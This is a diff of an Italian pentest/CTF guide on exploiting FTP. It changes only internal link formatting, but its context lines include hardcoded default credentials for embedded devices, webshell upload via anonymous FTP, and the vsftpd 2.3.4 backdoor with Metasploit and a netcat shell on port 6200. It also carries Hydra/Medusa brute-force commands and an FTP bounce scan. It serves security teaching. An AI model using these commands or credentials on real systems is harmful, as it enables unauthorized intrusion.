@@ -20,7 +20,7 @@ tags:
 
 La porta 20 è il canale dati del protocollo FTP in modalità attiva — e rappresenta uno dei vettori d'attacco più sottovalutati in ambiente lab e CTF. Ogni volta che un server FTP trasferisce file o directory listing in active mode, il traffico transita dalla porta 20 del server verso una porta alta del client, in chiaro. Questo significa **credenziali, file sensibili e configurazioni leggibili da chiunque intercetti il flusso**. In un pentest, la porta 20 non si attacca direttamente: si sfrutta attraverso la porta 21 (canale comandi), abusando della relazione tra i due canali per ottenere accesso, esfiltrare dati e pivotare nella rete interna.
 
-FTP resta presente nel 2026 per sistemi legacy, dispositivi IoT con risorse limitate e workflow enterprise consolidati. Nei laboratori e nelle CTF, server come vsftpd 2.3.4 e ProFTPD 1.3.5 vengono deliberatamente deployati con misconfigurazioni che trasformano la porta 20/21 in un entry point diretto verso una shell root. Questa guida copre l'intera kill chain: dalla reconnaissance con [nmap](https://hackita.it/articoli/nmap) fino alla post-exploitation, con comandi copy-paste e output reali.
+FTP resta presente nel 2026 per sistemi legacy, dispositivi IoT con risorse limitate e workflow enterprise consolidati. Nei laboratori e nelle CTF, server come vsftpd 2.3.4 e ProFTPD 1.3.5 vengono deliberatamente deployati con misconfigurazioni che trasformano la porta 20/21 in un entry point diretto verso una shell root. Questa guida copre l'intera kill chain: dalla reconnaissance con [nmap](https://hackita.it/articoli/nmap/) fino alla post-exploitation, con comandi copy-paste e output reali.
 
 ***
 
@@ -48,7 +48,7 @@ FTP è l'unico protocollo mainstream che utilizza **due connessioni TCP separate
 
 **Perché questo conta in un pentest:** in active mode, il server deve poter aprire connessioni verso il client. Molti firewall aziendali devono quindi aprire porte o usare moduli ALG (Application Layer Gateway) per ispezionare i comandi PORT — creando attack surface aggiuntiva. La trasmissione in chiaro sul canale dati espone ogni file trasferito a sniffing.
 
-Le **misconfigurazioni comuni** sulla porta 20 includono: permettere il comando PORT verso IP arbitrari (abilitando il [FTP bounce](https://hackita.it/articoli/ftp-bounce)), non restringere il range di porte passive, assenza di TLS sul canale dati e server FTP eseguiti con privilegi root.
+Le **misconfigurazioni comuni** sulla porta 20 includono: permettere il comando PORT verso IP arbitrari (abilitando il [FTP bounce](https://hackita.it/articoli/ftp-bounce/)), non restringere il range di porte passive, assenza di TLS sul canale dati e server FTP eseguiti con privilegi root.
 
 ***
 
@@ -156,7 +156,7 @@ Le tecniche offensive su FTP si dividono in tre categorie: abuso di funzionalit�
 
 In un ambiente CTF, prima del brute force provare manualmente le combinazioni più comuni: `anonymous`/vuoto, `ftp`/`ftp`, `admin`/`admin`, `root`/`root`, `ftpuser`/`password`. I server FTP non hanno password di default proprie — autenticano contro gli account di sistema — ma i device embedded (APC UPS, Schneider PLC, Beijer HMI) spesso usano credenziali hardcoded come `device`/`apc` o `sysdiag`/`factorycast@schneider`.
 
-**Accesso anonimo con upload:** se il login anonimo è abilitato con permessi di scrittura, caricare una [webshell](https://hackita.it/articoli/webshell) nella directory del web server rappresenta un path diretto verso RCE:
+**Accesso anonimo con upload:** se il login anonimo è abilitato con permessi di scrittura, caricare una [webshell](https://hackita.it/articoli/webshell/) nella directory del web server rappresenta un path diretto verso RCE:
 
 ```bash
 ftp 10.10.10.50
@@ -256,7 +256,7 @@ cat /root/proof.txt
 # CTF{vsftpd_backd00r_pwn3d}
 ```
 
-**Con [Metasploit](https://hackita.it/articoli/metasploit):**
+**Con [Metasploit](https://hackita.it/articoli/metasploit/):**
 
 ```bash
 msfconsole -q
@@ -323,14 +323,14 @@ run
 | Recon   | netcat                                            | `nc -vn target 21`                                 | Banner grabbing rapido             |
 | Enum    | nmap NSE                                          | `--script=ftp-anon,ftp-bounce`                     | Check accesso anonimo e bounce     |
 | Enum    | searchsploit                                      | `searchsploit vsftpd 2.3.4`                        | Ricerca exploit locali             |
-| Brute   | [Hydra](https://hackita.it/articoli/searchsploit) | `hydra -L users.txt -P pass.txt ftp://target`      | Brute force parallelo              |
-| Brute   | [Medusa](https://hackita.it/articoli/medusa)      | `medusa -h target -U users.txt -P pass.txt -M ftp` | Alternativa a Hydra                |
+| Brute   | [Hydra](https://hackita.it/articoli/searchsploit/) | `hydra -L users.txt -P pass.txt ftp://target`      | Brute force parallelo              |
+| Brute   | [Medusa](https://hackita.it/articoli/medusa/)      | `medusa -h target -U users.txt -P pass.txt -M ftp` | Alternativa a Hydra                |
 | Exploit | Metasploit                                        | `use exploit/unix/ftp/vsftpd_234_backdoor`         | Exploitation automatizzata         |
-| Exploit | [netcat](https://hackita.it/articoli/netcat)      | `nc -vn target 6200`                               | Connessione shell manuale          |
+| Exploit | [netcat](https://hackita.it/articoli/netcat/)      | `nc -vn target 6200`                               | Connessione shell manuale          |
 | Post    | python3                                           | `python3 -c 'import pty;pty.spawn("/bin/bash")'`   | Stabilizzazione shell              |
 | Pivot   | nmap                                              | `nmap -b ftp:ftp@relay target_interno`             | Bounce scan rete interna           |
 
-La pipeline operativa segue un flusso lineare: **nmap** identifica il servizio → **script NSE** enumera vulnerabilità e accesso anonimo → **searchsploit** verifica exploit disponibili → **Hydra/Metasploit** attacca → **netcat** stabilisce la connessione → strumenti di [privilege escalation](https://hackita.it/articoli/privilege-escalation) completano la catena.
+La pipeline operativa segue un flusso lineare: **nmap** identifica il servizio → **script NSE** enumera vulnerabilità e accesso anonimo → **searchsploit** verifica exploit disponibili → **Hydra/Metasploit** attacca → **netcat** stabilisce la connessione → strumenti di [privilege escalation](https://hackita.it/articoli/linux-privesc/) completano la catena.
 
 ***
 
